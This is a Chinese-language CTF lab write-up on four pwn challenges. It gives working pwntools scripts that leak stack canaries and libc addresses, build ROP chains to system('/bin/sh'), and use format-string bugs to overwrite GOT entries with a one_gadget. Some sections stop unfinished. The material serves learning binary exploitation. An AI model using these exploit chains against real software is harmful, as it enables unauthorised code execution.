---
title : "Pwn01 ROP and FSB"
date : 2024-07-21 01:09:28+0800 
draft : false
math : true
description : 一些学到的 ROP 与 FSB 的题目总结
categories:
    - 学习笔记
    - CS
    - CTF
tags:
    - Stack Overflow
    - FSB
---

> **Attention!**
> 
> 该界面内提到的任何代码与原程序都可在 https://github.com/nepl1t/nepl1t.github.io/tree/master/assets 内找到

# Task1 ropbasic

## Preparation

首先 `checksec` 一下程序，保护全开。 ROPgadget 只能找到一个 gadget：

---

<pre><font color="#5FD700">❯</font> <font color="#26A269">ROPgadget</font> --binary <u style="text-decoration-style:solid">./ropbasic</u> --only <font color="#A2734C">&quot;pop|ret&quot;</font>
Gadgets information
============================================================
0x00000000000011d3 : pop rbp ; ret
0x000000000000101a : ret
Unique gadgets found: 2
</pre>

嗯，至少找到一个 rbp_ret_addr 是 `0x00000000000011d3 `了。

反编译一下：

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+Ch] [rbp-114h]
  char s[264]; // [rsp+10h] [rbp-110h] BYREF
  unsigned __int64 v6; // [rsp+118h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  initbuf(argc, argv, envp);
  for ( i = 0; i <= 3; ++i )
  {
    memset(s, 0, 0x100uLL);
    printf("input> ");
    read(0, s, 0x1000uLL);
    puts(s);
  }
  return 0;
```

`main()` 的逻辑十分简单，每次将 `s` 开始的连续 `0x100` 个内存清零，然后输出，`read()` 0x1000个字节。肯定有栈溢出。

`s` 相对 rbp 的偏移地址为 `0x110`，考虑到程序开了 Canary，因此当务之急就是将其泄漏出来，否则栈溢出泄漏 libc 就无从说起。

## Leaking Canary

根据代码知道，使用 gdb 停到 call memset 时：

---

<pre>
0x555555555264    <font color="#AFD700">lea</font><font color="#FFFFFF">    </font><font color="#5FD7FF">rax</font><font color="#FFFFFF">, [</font><font color="#5FD7FF">rbp</font><font color="#FFFFFF"> - </font><font color="#AF87FF">0x110</font><font color="#FFFFFF">]</font>             <font color="#C01C28"><b>RAX</b></font> =&gt; <font color="#A2734C">0x7fffffffd9f0</font> ◂— 0
0x55555555526b    <font color="#AFD700">mov</font><font color="#FFFFFF">    </font><font color="#5FD7FF">edx</font><font color="#FFFFFF">, </font><font color="#AF87FF">0x100</font>                     <font color="#C01C28"><b>EDX</b></font> =&gt; 0x100
0x555555555270    <font color="#AFD700">mov</font><font color="#FFFFFF">    </font><font color="#5FD7FF">esi</font><font color="#FFFFFF">, </font><font color="#AF87FF">0</font>                         <b>ESI</b> =&gt; 0
0x555555555275    <font color="#AFD700">mov</font><font color="#FFFFFF">    </font><font color="#5FD7FF">rdi</font><font color="#FFFFFF">, </font><font color="#5FD7FF">rax</font>                       <font color="#C01C28"><b>RDI</b></font> =&gt; <font color="#A2734C">0x7fffffffd9f0</font> ◂— 0
►<font color="#26A269"><b>0x555555555278</b></font>    <font color="#AFD700"><b>call</b></font><font color="#FFFFFF">   </font><font color="#C01C28">memset@plt</font>                  &lt;<font color="#C01C28">memset@plt</font>&gt;
        <b>s</b>: <font color="#A2734C">0x7fffffffd9f0</font> ◂— 0
        <b>c</b>: 0
        <b>n</b>: 0x100
</pre>


然后查询 rdi 与 rsp 的值：

---

<pre><font color="#C01C28">*</font><font color="#C01C28"><b>RDI </b></font> <font color="#A2734C">0x7fffffffd9f0</font> ◂— 0
<b>RSP </b> <font color="#A2734C">0x7fffffffd9e0</font> ◂— 0
</pre>

那么， 从 rdi （0x7fffffffd9f0）开始依次读取内存数据到 rsp （0x7fffffffdb00）的位置：

---

<pre><font color="#C01C28"><b>pwndbg&gt; </b></font>x /40gx 0x7fffffffd9f0
<font color="#12488B">0x7fffffffd9f0</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffda00</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffda10</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffda20</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffda30</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffda40</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffda50</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffda60</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffda70</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffda80</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffda90</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffdaa0</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffdab0</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffdac0</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffdad0</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffdae0</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffdaf0</font>:	0x0000000000000000	0xe719bae42bbeac00
<font color="#12488B">0x7fffffffdb00</font>:	0x0000000000000001	0x00007ffff7c29d90
<font color="#12488B">0x7fffffffdb10</font>:	0x0000000000000000	0x0000555555555230
<font color="#12488B">0x7fffffffdb20</font>:	0x0000000100000000	0x00007fffffffdc18
<font color="#C01C28"><b>pwndbg&gt; </b></font></pre>

考虑到 `memset()` 函数在这里只清空了 0x100 的数据 （一直到 `0x7fffffffdaf0: 0x0000000000000000` ）  ，而 `0x7fffffffdaf8: 0xe719bae42bbeac00` ，这是一个 0x00 作结尾的数据，可以推测这就是 Canary，关于 `s` 的偏移值为 0x108。

```python
conn.recv(0x7) #0x7 bytes: b'input> '
offset = b'A'*(0x108)
conn.send(offset + b'B')
conn.recv(0x108)
Canary = u64(conn.recv(0x8)) - 0x42
conn.recv(0x9)
log.info("Canary:"+hex(Canary)) 
```

运行效果如下：

---

<pre>[<font color="#C01C28"><b>DEBUG</b></font>] Received 0x7 bytes:
    b&apos;input&gt; &apos;
[<font color="#C01C28"><b>DEBUG</b></font>] Sent 0x109 bytes:
    b&apos;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB&apos;
[<font color="#C01C28"><b>DEBUG</b></font>] Received 0x119 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA<font color="#12488B">│</font>AAAA<font color="#12488B">│</font>AAAA<font color="#12488B">│</font>AAAA│
    *
    00000100  41 41 41 41  41 41 41 41  42 <font color="#12488B">9f</font> 7e 4b  <font color="#12488B">15</font> <font color="#12488B">b6</font> 3e <font color="#12488B">f9</font>  │AAAA<font color="#12488B">│</font>AAAA<font color="#12488B">│</font>B<font color="#12488B">·</font>~K<font color="#12488B">│··</font>&gt;<font color="#12488B">·</font>│
    00000110  <font color="#12488B">01</font> <font color="#C01C28">0a</font> 69 6e  70 75 74 3e  20                        │<font color="#12488B">·</font><font color="#C01C28">·</font>in<font color="#12488B">│</font>put&gt;<font color="#12488B">│</font> │
    00000119
[<font color="#12488B"><b>*</b></font>] Canary:0xf93eb6154b7e9f00
</pre>

得到 Canary 为 `0xf93eb6154b7e9f00`

程序没有检测到栈溢出，而是正常退出，这说明 Canary 成功泄漏并绕过了。

## Leaking libc addr

由于开了 PIE，每次运行的基址都不一样，所以每次栈溢出 ROP 之前，都需要得到 libc 的地址。通过 `objdump -d` 可以发现程序里确实是有 `libc_start_main()` 的符号，我们可以找到它的地址，再减去其在 libc 中的偏移地址，从而得到 libc 地址。

首先，动态调试时（此时正在 `read()` 函数内）看到如下信息：

----

<pre><font color="#12488B">─────────────────────────[ BACKTRACE ]──────────────────────────</font>
 ► 0   0x55555555526b
   1   0x7ffff7c29d90
   2   0x7ffff7c29e40 __libc_start_main+128
   3   0x555555555125
</pre>
因此可以判定， `0x55555555526b` （作为 `read()` 函数的返回地址）位于 `main()` 内，因此 `0x7ffff7c29d90` 就是 `main()` 函数执行完后的返回地址。

注意到 `0x7ffff7c29e40` （ 相对 `0x7ffff7c29d90` 是 `0xb0`）相对于 `__libc_start_main()` 的偏移值是 `0x80` (128) ，因此可以得到 `main()` 的返回地址相对于 `__libc_start_main()` 的偏移值是 `0x30` 。通过前面栈溢出得到 `main()` 的返回地址后，我们就可以得到`__libc_start_main()` 的实际地址。 



通过如下的 python 脚本，可以得到 libc 的地址：

```python
# Leaking libc address
__libc_start_main_offset = libc.symbols['__libc_start_main']
# pause()
conn.send(offset + b'AABBCCDDEEFFGGHH') #0x108 + 0x8 + 0x8 = 0x118
conn.recv(0x118)
received = conn.recvline() #后面一个 '\ninput> ' (printf的内容)
conn.recv(0x7)
received = received.strip(b'\n')
received = received.ljust(8, b'\0')
print(received)
# pause()
main_return_addr = u64(received)
log.info("waitwhat? " + hex(main_return_addr))

__libc_start_main_addr = main_return_addr + 0x30 
libc_addr = __libc_start_main_addr - __libc_start_main_offset
log.info("main_return_addr:      {:016X}".format(main_return_addr)) 
log.info("__libc_start_main_addr:{:016X}".format(__libc_start_main_addr)) 
log.info("libc_addr:             {:016X}".format(libc_addr)) 
```

运行效果如下：

---

<pre>[<font color="#C01C28"><b>DEBUG</b></font>] Sent 0x118 bytes:
    b&apos;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBCCDDEEFFGGHH&apos;
[<font color="#C01C28"><b>DEBUG</b></font>] Received 0x126 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA<font color="#12488B">│</font>AAAA<font color="#12488B">│</font>AAAA<font color="#12488B">│</font>AAAA│
    *
    00000100  41 41 41 41  41 41 41 41  41 41 42 42  43 43 44 44  │AAAA<font color="#12488B">│</font>AAAA<font color="#12488B">│</font>AABB<font color="#12488B">│</font>CCDD│
    00000110  45 45 46 46  47 47 48 48  <font color="#12488B">90</font> <font color="#12488B">9d</font> <font color="#12488B">c2</font> 42  38 77 <font color="#C01C28">0a</font> 69  │EEFF<font color="#12488B">│</font>GGHH<font color="#12488B">│···</font>B<font color="#12488B">│</font>8w<font color="#C01C28">·</font>i│
    00000120  6e 70 75 74  3e 20                                  │nput<font color="#12488B">│</font>&gt; │
    00000126
b&apos;\x90\x9d\xc2B8w\x00\x00&apos;
[<font color="#12488B"><b>*</b></font>] waitwhat? 0x773842c29d90
[<font color="#12488B"><b>*</b></font>] main_return_addr:      0000773842C29D90
[<font color="#12488B"><b>*</b></font>] __libc_start_main_addr:0000773842C29DC0
[<font color="#12488B"><b>*</b></font>] libc_addr:             0000773842C00000
</pre>

得到 libc 的地址为 ` 0x0000773842C00000`

## Getting system shell

已经知道了 libc 的地址，那就从 libc 里面找 gadget：`ROPgadget --binary ./libc.so.6 --only "pop|ret"` 

需要找一个 rdi_ret 与一个单独的 ret  ，但是单独的 ret 空转的原因，上网说是因为**ubuntu18及以上**在**调用system函数的时候会先进行一个检测**，如果此时的**栈没有16字节对齐的话**，就会**强行把程序crash掉**，所以需要**栈对齐** ，但我并没有看懂。无论如何，在 libc 里面找到了这样两个 gadgets：

---

<pre>0x000000000002a3e5 : pop rdi ; ret
0x0000000000029139 : ret</pre>

然后像下面这样构造 payload ，就可以直接获取 shell 了：

```python
# Getting system shell
ret_addr = 0x0000000000029139 + libc_addr
rdi_rtn_addr = 0x000000000002a3e5 + libc_addr
system_addr = libc.symbols['system'] + libc_addr #system函数的地址
bin_sh_addr = next(libc.search('/bin/sh')) + libc_addr #‘/bin/sh’的地址

payload = offset + p64(Canary) + b'AABBCCDD' + p64(ret_addr) + p64(rdi_rtn_addr) + p64(bin_sh_addr) + p64(system_addr) 
log.info("system_addr:{:016X}".format(system_addr)) 
log.info("bin_sh_addr:{:016X}".format(bin_sh_addr)) 

# pause()
conn.send(payload)
conn.recv(0x110)

conn.send(payload)
conn.recv(0x110)
conn.interactive()
```

运行效果如下：

![image-20240727002154799.png](https://s2.loli.net/2024/07/29/RmdVi6tZyqKMfT2.png)

成功获得 flag 为 `AAA{oh_R0P_1s_b4b@b4b@s1c~}`

#### Approach 2 ORW

ORW 即 `open(file, olfag)` `read(fd, buf, n_bytes)` 与 `write(fd, buf, n_bytes)` 。

所以要用 rdi 对应文件地址 `file` 用于 open， 对应 `fd` 项用于 read 与 write：在ORW中，我们需要设置 read 的 `fd` 为 3，表示从文件中读取，write的 `fd` 还是如常，依旧为 1 ；

用 rsi 对应 `oflag` 用于 open （由于只用读取就行了所以取 0 ），对应 `buf` 用于 read 与 write；

最后用 rdx 对应 `n_bytes` 用于 read 与 write 。

我们先前已经找到了 `pop_rdi_ret` 的 gadget了，接着找 rsi 与 rdx 的 ：

```
0x000000000011f2e7 : pop rdx ; pop r12 ; ret
0x000000000002be51 : pop rsi ; ret
```

所以对于调用 `open(rdi -> "./flags.txt", rsi -> 0)` ，我们可以将栈写成这个样子：

| `pop_rdi_ret_addr` | `"./flags.txt"` | `pop_rsi_ret` | 0x00000000 | `open_addr` |
| ------------------ | --------------- | ------------- | ---------- | ----------- |

对于调用 `read(rdi -> 3, rsi -> oflag)` ，

# Task2 onerop

本题目的完整代码为 attachment 中的 `pwnlab2_task2_code.py`

## Preparation & Leaking libc addr

`checksec` 一下，没有开 PIE 与 Canary，感觉比第一题友好多了，用 IDA 编译出来的 `main()` 也是十分简单：

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 buf[32]; // [rsp+0h] [rbp-100h] BYREF

  initbuf(argc, argv, envp);
  memset(buf, 0, sizeof(buf));
  read(0, buf, 0x1000uLL);
  puts((const char *)buf);
  return 0;
}
```

`0x100` 长的内存却给了 `0x1000` 的读入，妥妥的栈溢出。

用 ROPgadget 一看，甚至题目本身就有一些好用的 gadget：

---

<pre>0x00000000004011c5 : pop rdi ; ret
0x000000000040101a : ret
0x0000000000401181 : retf</pre>

再者，用 `seccomp-tools dump` 查看，发现程序没有开启沙箱，可以考虑 get shell 了。现在要做的就是泄漏 libc 基址，然后使用 libc 的 `system(/bin/sh)` 获取 shell 控制权。

同时，使用 gdb 动态调试，在 Backtrace 栏中发现

---

<pre><font color="#12488B">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</font>
 ► 0         0x40131a main+336
   1   0x7ffff7c2a1ca __libc_start_call_main+122
   2   0x7ffff7c2a28b __libc_start_main+139
   3         0x4010b5 _start+37
</pre>

所以一开始的思路，就是利用栈溢出让 `puts()` 函数输出 `main()` 的返回地址（关于 `__libc_start_call_main` 的偏移地址是 +122），而 `__libc_start_call_main`  相对于 `__libc_start_main` 的偏移地址是 -0xB0 ，可以因此求出 `__libc_start_main` 的实际地址，然后求得 libc 的地址。但是由于没有循环，且正常流程只能进行一次输入，所以首次输入（尚不知道 libc 地址）就要构造 ROP 链使得 `main()` 返回到它自身，然后在第二次输入（此时已经知道 libc 地址）构造 ROP 链以获取 shell 控制权。

看起来很好，但是失败了——最后程序没有像设想的打开 shell，而是报段错误退出。为什么呢？ Debug 后发现，我们在第一次输入时为了让 `main()` 返回到它自身，肯定要把原来 `main()` 的返回地址覆盖掉，所以我们用 `puts()` 函数输出的，其实是 `main()` 的地址，而不是`__libc_start_call_main + 122` ，这个思路错了。

既然不能泄漏 `main()` 原来的返回地址，那就泄漏 `main()` 调用过的函数。看了一堆作题笔记后，发现 `puts()`  比较好弄：

我们第一次输入前，先求 `puts()` 的 plt 与 got 地址（因为 glibc 的延迟绑定机制），然后通过第一次输入把栈覆写成这个形式：

| `pop_rdi_ret_addr` | `puts_got` | `puts_plt` | `main_addr` |
| ------------------ | ---------- | ---------- | ----------- |

这样，我们在第一次输出后，`main()` 函数 return （执行第一个 `ret` 时 `rbp` 指向 `pop_rdi_ret_addr` ）到 `pop rdi; ret;` 的 gadget， 就可以将 `puts()` 的实际地址（在 GOT 表内，所以是 `puts_got` ）作为参数传给 rdi ，然后再次 return （执行第二个 `ret` 时 `rbp` 指向 `puts_plt` ）到 `puts()` 函数从而输出它自己的实际地址，然后再 return 到 `main()` 函数。我们就可以用 `puts()` 函数的地址求 libc 的地址了。

代码如下：

```python
# Step one Leaking puts() address & return to main() again
main_addr = 0x00000000004011CA
ret_addr = 0x000000000040101a
rdi_ret_addr = 0x00000000004011c5   
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
puts_offsets = libc.symbols['puts']
offset = 0x100 + 0x8
payload1 = b'A'*offset + p64(rdi_ret_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
# pause()
conn.send(payload1)
# conn.interactive();
conn.recvline() #first puts()
received1 = conn.recvline() #second puts() outputs its addr
received1 = received1.strip(b'\n')
received1 = received1.ljust(8, b'\0')
puts_addr = u64(received1)
libc_addr = puts_addr - puts_offsets
log.info("puts_addr => "+ hex(puts_addr))
log.info("libc_addr => 0x{:016X}".format(libc_addr)) 
```

效果如下：

![image-20240727205306318.png](https://s2.loli.net/2024/07/29/N7zCeuRF8pivmtY.png)

可以看到获取的 libc 地址为 `0x00007F6506C9D000`

## Getting system shell

最后，按如下构造 payload ，可以获取 shell：

```python
# Step two Getting system shell
system_addr = libc.symbols['system'] + libc_addr #system函数的地址
bin_sh_addr = next(libc.search('/bin/sh')) + libc_addr #‘/bin/sh’的地址
log.info("bin_sh_addr => {:016X}".format(bin_sh_addr)) 
log.info("system_addr => {:016X}".format(system_addr)) 
payload2 = b'A'*offset + p64(ret_addr) + p64(rdi_ret_addr) + p64(bin_sh_addr) + p64(system_addr)
# pause()
conn.send(payload2)
conn.interactive()
```

运行后效果如下：

![image-20240727205158947.png](https://s2.loli.net/2024/07/29/5fQkt6G91YDpjPn.png)

得到 flag 为 `AAA{r0p_oN3_5Im3_ROP_f0r3ve3}` 

## Task3 onefsb

本题目的完整代码为 attachment 中的 `pwnlab2_task3_code.py`

## Preparation

checksec 一下，是关闭了 PIE 保护，同时打开的 Partial RELRO 的 64 位程序，注意到开了 Canary，栈溢出要小心点。

IDA 反编译一下，`main()` 基本逻辑是这样的：

```c
  char s[8]; // [rsp+0h] [rbp-110h] BYREF
  unsigned __int64 v36; // [rsp+108h] [rbp-8h]

  v36 = __readfsqword(0x28u); // 设置 Canary
  initbuf(argc, argv, envp);
  printf("what's your message: ");
  memset(s, 0, 0x100) // 将 [rbp-110h] 开始到 [rbp-11h] 共 256 个字节的内存清零 
  fgets(s, 255, stdin); // 从 s 开始输入 255 256 个字节
  printf(s);
  puts("bye");
  return 0;
```

做这题的时候，我首先想到利用 FSB Bug ，使用类似于前两道  Task 的思路，先泄漏 `main()` 的返回地址从而获得 libc 地址，如果不方便获得 `main()` 的返回地址，就想办法泄漏其他函数的地址，然后利用 ROP 将程序 return 到 `system('/bin/sh')` 上，但是实际操作时遇到了只有一次利用 FSB 的机会，若劫持控制流就不能泄漏  `main()` 的返回地址 ，然后是 `printf()` 使用 `%u` 写入时导致段错误，以及直接写 ROP 链太麻烦等各种困难

然后就是（请求场外援助 sad 后得到的 hint） Partial RELRO ，它允许我们能够覆写 GOT 表，可不可以获取 `system` 的 GOT 表地址将其覆盖到 `main()` 要调用的一个函数在 GOT 表上的地址从而达到调用 `system("/bin/sh")` 的机会？结果也不行，一次利用 FSB 的限制不能让我做到这一点。那能不能用覆写 GOT 表从而做到无限利用 FSB ? 等等，`main()` 结束前怎么有一个 `puts("bye")` ，豁然开朗了：把 `puts_got` 变成 `main()` ，这样就让做完恶作剧的小鬼程序被狠狠脑控定身任我为非作歹 😡😡😡 ；至于 ROP 链，换成一个 one_gadget ，在这里找到的是这个：

---

<pre><font color="#D7D7FF">0xebc85</font> execve(&quot;/bin/sh&quot;, <font color="#5FFF00">r10</font>, <font color="#5FFF00">rdx</font>)
<font color="#FF5F5F">constraints</font>:
  address <font color="#5FFF00">rbp</font>-<font color="#D7D7FF">0x78</font> is writable
  [<font color="#5FFF00">r10</font>] == NULL || <font color="#5FFF00">r10</font> == NULL || <font color="#5FFF00">r10</font> is a valid argv
  [<font color="#5FFF00">rdx</font>] == NULL || <font color="#5FFF00">rdx</font> == NULL || <font color="#5FFF00">rdx</font> is a valid envp
</pre>

在第一次 payload，要做的就是：劫持控制流，将 `puts_got` 覆写成 `main()` ，让程序想 "bye" 却被我狠狠脑控当场拿下

第二次，输出 `printf()` 地址从而获取 libc 地址，从而获得 one_gadget 的地址

第三次，就是将 `puts_got` 覆写成 one_gadget ，对我言听计从 😤😤😤

## Getting offsets

首先打开程序，确定格式化字符串的相对偏移。打开程序，输入 `AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p` ，结果如下：

![image-20240728164321356.png](https://s2.loli.net/2024/07/29/kmynu7LHE4gA6zG.png)

可以看到， `AAAAAAAA` ，即 `0x4141414141414141` 位于格式化字符串后的第六个偏移。

使用 gdb 调试， 输入 `AAAAAAAA` 后断点在 `printf()` 内，然后看栈内容，结果如下：

---

<pre><font color="#C01C28"><b>pwndbg&gt; </b></font>x /40gx $rsp
<font color="#12488B">0x7fffffffdac8</font>:	0x000000000040139e	0x4141414141414141
<font color="#12488B">0x7fffffffdad8</font>:	0x000000000000000a	0x0000000000000000
<font color="#12488B">0x7fffffffdae8</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffdaf8</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffdb08</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffdb18</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffdb28</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffdb38</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffdb48</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffdb58</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffdb68</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffdb78</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffdb88</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffdb98</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffdba8</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffdbb8</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffdbc8</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffdbd8</font>:	0xf53edbb42f9f1d00	0x0000000000000001
<font color="#12488B">0x7fffffffdbe8</font>:	0x00007ffff7c29d90	0x0000000000000000
<font color="#12488B">0x7fffffffdbf8</font>:	0x00000000004011fd	0x0000000100000000
<font color="#C01C28"><b>pwndbg&gt; </b></font>p $rbp
<font color="#2AA1B3">$3</font> = (void *) <font color="#12488B">0x7fffffffdbe0</font>
<font color="#C01C28"><b>pwndbg&gt; </b></font>p $rsp
<font color="#2AA1B3">$4</font> = (void *) <font color="#12488B">0x7fffffffdac8</font>
</pre>

可以看到，输入的格式字符串 `AAAAAAAA` 位于栈的第二位，由于此时位于 `printf()` 函数内， **栈的最顶部 rbp 指向的是 `printf()` 的返回地址，所以不算做参数**，同时由于是 64 位程序，前六个参数在寄存器内，所以格式字符串就是 `printf()` 的第七个参数，也就是格式化字符串（ rdi ）后的第六个偏移。

## Hijacking control flow

首先就是拿下 `puts()` ，像这样构建 payload ：

```python
context(arch = 'amd64', os='linux', log_level='DEBUG')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
printf_got = elf.got['printf']
printf_offset = libc.symbols['printf']
# pause()
main_addr = 0x4011fd 
payload = fmtstr_payload(6,{puts_got:main_addr},write_size="short")
conn.sendlineafter(b"what's your message: ", payload)
conn.interactive()
```

运行，结果如下：

![image-20240728224258130.png](https://s2.loli.net/2024/07/29/jsaKU3qtSnzMcm2.png)

## Leaking libc address

有了前面两道 Task 的经验，这次 leak 可以算很顺利了：

```python
# Second payload: leaking libc address
payload2 = b'%7$sKKKK' + p64(printf_got)
conn.sendlineafter(b"what's your message: ", payload2)
recv = conn.recvuntil(b'KKKK')
recv = recv.strip(b'KKKK')
recv = recv.ljust(8,b'\0')
printf_addr = u64(recv)
libc_addr = printf_addr - printf_offset
log.success("printf_addr => 0x{:016X}".format(printf_addr))
log.success("libc_addr   => 0x{:016X}".format(libc_addr))
conn.interactive()
```

运行结果如下：

![image-20240728225353011.png](https://s2.loli.net/2024/07/29/5XrJbkKFaWAp3P9.png)

可以看到最终得到的 libc 地址为 `0x00007F3EDFC00000`

## Getting system shell

```python
# Third payload: getting system shell
pop_rdi_addr = 0x000000000002a3e5 + libc_addr
bin_sh_addr = next(libc.search('/bin/sh')) + libc_addr
system_addr = libc.symbols['system'] + libc_addr
one_gadget = 0xebc85 + libc_addr
payload3 = fmtstr_payload(6,{puts_got:one_gadget})
conn.sendlineafter(b"what's your message: ", payload3)
conn.interactive()
```

运行效果如下：

![image-20240728225703142.png](https://s2.loli.net/2024/07/29/ybIgmqwYWkE7XUQ.png)

成功获取 shell 的控制权。最终得到 flag 为 `AAA{i_l0v3_fmtstr_payload_H0p3_u_Loveit_2}` ，然而我自我感觉也许可能不会很 love it :D 卡了我两天（怨）

## Task4 fsb-stack

本题目的完整代码为 attachment 中的 `pwnlab2_task4_code.py`

## Preparation

`checksec` 一下，除了 Canary 以外保护全开（在 IDA 里反汇编也没看到 stack_check_fail ）。 `main()` 反编译后的代码如下：

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  __int64 s[66]; // [rsp+0h] [rbp-210h] BYREF

  s[65] = __readfsqword(0x28u);
  initbuf(argc, argv, envp);
  memset(s, 0, 512);
  while ( 1 )
  {
    memset(s, 0, 0x200uLL);
    fgets((char *)s, 512, stdin);
    printf((const char *)s);
  }
}
```

自带无限次使用次数的 FSB 。打开程序，输入 `AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p` 确认格式字符串偏移，结果如下：

![image-20240728230716046.png](https://s2.loli.net/2024/07/29/uNBpfj9A6l2Q4Dv.png)

可以看到 `AAAAAAAA` 位于格式字符串后第六个偏移。

目前的想法就是，通过 `printf()` 泄漏出 `main()` 的返回地址得到 libc 地址。

但是打开了 FULL RELRO ，不能覆写 GOT 表，所以试试 ROP，利用格式字符串任意位置泄漏栈地址，然后利用任意写将 `printf()` 的返回地址设为 one_gadget。

## Leaking libc address

通过 gdb 动态调试，断点进入 `printf()` 内，在栈中寻找到 `main()` 的返回地址相对于格式字符串的偏移位置。首先来看 Backtrace ，确定 `printf()` 的返回地址为 `0x55555555528d` ，位于 `main()` 内，则 `main()` 的返回地址为 `0x7ffff7c29d90` ，而 `0x7ffff7c29e40` 相对 `__libc_start_main` 的偏移是 +128 ，所以 `__libc_start_main` 相对  `main()` 的返回地址 的偏移是 (-0xd90 + 0xe40) - 128 = +0x30 。

<pre><font color="#12488B">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</font>
 ► 0   0x7ffff7c606f0 printf
   1   0x55555555528d
   2   0x7ffff7c29d90
   3   0x7ffff7c29e40 __libc_start_main+128
   4   0x5555555550e5
<font color="#12488B">────────────────────────────────────────────────────────────────────────────────</font>
<font color="#C01C28"><b>pwndbg&gt; </b></font>
</pre>

接下来，在栈中找到 `0x7ffff7c29d90` 相对于格式字符串的偏移位置：

<pre><font color="#12488B">────────────────────────────────────────────────────────────────────────────────</font>
<font color="#C01C28"><b>pwndbg&gt; </b></font>x /100gx $rsp
<font color="#12488B">0x7fffffffd9c8</font>:	0x000055555555528d	0x7944734973696854
<font color="#12488B">0x7fffffffd9d8</font>:	0x7375446c65674e41	0x000000000a726574
<font color="#12488B">0x7fffffffd9e8</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffd9f8</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">< Skipped ></font>
<font color="#12488B">0x7fffffffdbc8</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffdbd8</font>:	0x5b70ffa5294da700	0x0000000000000001
<font color="#ff0000">0x7fffffffdbe8</font>:	0x00007ffff7c29d90	0x0000000000000000
<font color="#12488B">0x7fffffffdbf8</font>:	0x00005555555551f0	0x0000000100000000
<font color="#12488B">< Skipped ></font>
<font color="#12488B">0x7fffffffdcb8</font>:	0x00005555555550c0	0x00007fffffffdcf0
<font color="#12488B">0x7fffffffdcc8</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffdcd8</font>:	0x00005555555550e5	0x00007fffffffdce8
<font color="#C01C28"><b>pwndbg&gt; </b></font>
</pre>


可以看到， `0x00007ffff7c29d90` 位于 `0x7fffffffdbe8` 处，而 rsp 指向 `0x7fffffffd9c8` ，所以在栈中是第 69 位，因此就是格式字符串的第 73 位参数。事实上，若在调试时输入 `%73$016llx` ，程序确实会输出 `00007ffff7c29d90` ，符合要求。

编写下面的 python 代码以获取 libc 基址：
